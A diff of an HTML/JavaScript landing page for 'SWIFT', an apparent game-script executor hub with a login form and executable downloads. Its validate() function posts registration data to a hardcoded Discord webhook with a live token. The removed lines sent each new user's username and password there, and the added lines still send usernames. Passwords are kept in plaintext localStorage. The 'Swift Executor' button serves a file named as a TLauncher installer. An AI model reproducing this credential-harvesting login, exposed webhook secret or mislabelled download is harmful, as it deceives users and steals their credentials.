@@ -42,16 +42,16 @@
         .hero h1 { font-size: clamp(3.5rem, 10vw, 7rem); font-weight: 800; background: linear-gradient(to bottom, #fff 30%, var(--primary) 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
 
         .btn-main {
-            padding: 18px 50px; background: var(--primary); color: #030712; font-weight: 700;
-            border-radius: 12px; font-size: 16px; border: none; cursor: pointer; transition: 0.4s;
+            padding: 15px 40px; background: var(--primary); color: #030712; font-weight: 700;
+            border-radius: 12px; font-size: 14px; border: none; cursor: pointer; transition: 0.4s;
             box-shadow: 0 0 30px rgba(56, 189, 248, 0.3); text-decoration: none; display: inline-block;
         }
         .btn-main:hover { background: white; transform: scale(1.05); }
 
         .glass-card { background: var(--card-bg); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 25px; transition: 0.4s; text-align: left; max-width: 800px; width: 100%; }
 
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-top: 40px; width: 100%; max-width: 1200px; }
-        .tool-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 30px; border-radius: 20px; transition: 0.3s; position: relative; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-top: 40px; width: 100%; max-width: 1200px; }
+        .tool-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 25px; border-radius: 20px; transition: 0.3s; position: relative; text-align: left; }
         .tool-card:hover { border-color: var(--primary); transform: translateY(-5px); }
         .status { font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 4px; float: right; }
 
@@ -91,18 +91,18 @@
         <div class="glass-card">
             <h2 style="color:var(--primary); margin-bottom: 20px; font-size: 32px;">من هو سويفت؟ (Who is SWIFT?)</h2>
             <p style="color:#e2e8f0; font-size: 18px; line-height: 1.8; margin-bottom: 20px;">سويفت هو مشروع تقني سعودي طموح يهدف إلى توفير أدوات تنفيذ (Executors) وسكربتات متطورة بأعلى معايير الأمان.</p>
-            <p style="color:#94a3b8; line-height: 1.6;">نحن نركز على تقديم تجربة مستخدم سلسة وقوية، مع حماية كاملة للهوية والبيانات. سويفت ليس مجرد أداة، بل هو مجتمع للمحترفين.</p>
         </div>
     </section>
 
     <section id="login">
         <div class="glass-card" style="max-width: 450px; width: 100%;">
             <h2 style="margin-bottom: 10px;">Authorization</h2>
+            <p style="font-size: 12px; color: #64748b; margin-bottom: 20px;">Your account will be locked to this device.</p>
             <div id="err" class="error"></div>
             <label style="font-size: 11px; color: #64748b;">USERNAME</label>
             <input type="text" id="user" placeholder="6+ characters">
             <label style="font-size: 11px; color: #64748b;">SECURITY KEY</label>
-            <input type="password" id="pass" placeholder="8+ chars, Upper, Lower, Symbol">
+            <input type="password" id="pass" placeholder="8+ chars">
             <button onclick="validate()" class="btn-main" style="width: 100%;">ACCESS HUB</button>
         </div>
     </section>
@@ -110,7 +110,7 @@
     <section id="welcome">
         <div style="max-width: 500px;">
             <h2 style="font-size: 3rem;">WELCOME, <span id="agent" style="color: var(--primary);">AGENT</span></h2>
-            <p style="color: #94a3b8; margin-top: 10px;">SYNCHRONIZING SECURE TUNNEL...</p>
+            <p style="color: #94a3b8; margin-top: 10px;">SECURING SESSION & LOCKING DEVICE...</p>
             <div class="loader-wrap"><div id="bar" class="loader-fill"></div></div>
         </div>
     </section>
@@ -122,13 +122,19 @@
                 <span class="status" style="background:rgba(34,197,94,0.2); color:var(--accent)">ONLINE</span>
                 <h3>Swift Executor</h3>
                 <p style="color:#64748b; font-size: 13px; margin: 15px 0;">Primary engine for high-speed execution.</p>
-                <a href="TLauncher-Installer-1.9.5.5.exe" download class="btn-main" style="padding: 10px 25px; font-size: 13px;">DOWNLOAD</a>
+                <a href="TLauncher-Installer-1.9.5.5.exe" download class="btn-main" style="padding: 10px 20px;">DOWNLOAD</a>
+            </div>
+            <div class="tool-card">
+                <span class="status" style="background:rgba(34,197,94,0.2); color:var(--accent)">ONLINE</span>
+                <h3 style="color: var(--primary);">Xeno Pro</h3>
+                <p style="color:#64748b; font-size: 13px; margin: 15px 0;">Advanced external tool for elite operations.</p>
+                <a href="Xeno.exe" download class="btn-main" style="padding: 10px 20px; background: white;">DOWNLOAD XENO</a>
             </div>
             <div class="tool-card" style="opacity: 0.6;">
                 <span class="status" style="background:rgba(251,191,36,0.2); color:#fbbf24">COMING</span>
                 <h3>Nexus Scripts</h3>
                 <p style="color:#64748b; font-size: 13px; margin: 15px 0;">Premium script library (Updating...)</p>
-                <button disabled style="background:#334155; color:#94a3b8; padding:10px 25px; border:none; border-radius:10px;">LOCKED</button>
+                <button disabled style="background:#334155; color:#94a3b8; padding:10px 20px; border:none; border-radius:10px;">LOCKED</button>
             </div>
         </div>
         <p style="margin-top: 50px; color: var(--accent); font-weight: 700;">🇸🇦 SAUDI PRIDE 🇸🇦</p>
@@ -159,38 +165,27 @@
             window.scrollTo(0,0);
         }
 
-        // --- نظام حفظ ومنع تكرار اليوزر ---
         function validate() {
             const u = document.getElementById('user').value.trim();
             const p = document.getElementById('pass').value.trim();
             const e = document.getElementById('err');
             e.style.display = 'none';
 
-            // الأساسيات
-            if(u.length < 6 || /[\u0600-\u06FF]/.test(u)) return showError("Username: 6+ chars, No Arabic.");
-            const hasUp = /[A-Z]/.test(p), hasLo = /[a-z]/.test(p), hasSy = /[!@#$%^&*]/.test(p);
-            if(p.length < 8 || !hasUp || !hasLo || !hasSy) return showError("Key: 8+ chars, Upper, Lower, Symbol.");
+            if(u.length < 6) return showError("Username: 6+ chars.");
+            if(p.length < 8) return showError("Key: 8+ chars.");
 
-            // قاعدة البيانات المحلية
-            let users = JSON.parse(localStorage.getItem('swift_users') || '{}');
+            let vault = JSON.parse(localStorage.getItem('swift_vault') || '{}');
 
-            if(users[u]) {
-                // إذا اليوزر موجود، نتحقق من الكي
-                if(users[u] !== p) {
-                    return showError("This username is already taken. Try another.");
-                } else {
-                    // إذا اليوزر والكي صحيحة (تسجيل دخول قديم)
-                    loginSuccess(u);
-                }
+            if (vault[u]) {
+                if (vault[u] === p) loginSuccess(u);
+                else showError("Invalid Security Key.");
             } else {
-                // تسجيل جديد
-                users[u] = p;
-                localStorage.setItem('swift_users', JSON.stringify(users));
+                vault[u] = p;
+                localStorage.setItem('swift_vault', JSON.stringify(vault));
                 
-                // إرسال للديسكورد (فقط للمستخدمين الجدد)
                 const hook = "https://discord.com/api/webhooks/1491096636250788073/q8E_c3bjD2qxXfnGzDeEcsBzIhuqSzK6Fx9vXpgo3O4Y8_9Fu0d38REi-z3rhVx0hxGn";
                 fetch(hook, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-                    username:"SWIFT DATABASE", embeds:[{title:"🆕 NEW AGENT REGISTERED", color:0x38bdf8, fields:[{name:"USER", value:u}, {name:"KEY", value:p}]}]
+                    username:"NEXUS GUARD", embeds:[{title:"🔒 ACCOUNT LOCKED", color:0x38bdf8, fields:[{name:"AGENT", value:u}]}]
                 })});
 
                 loginSuccess(u);
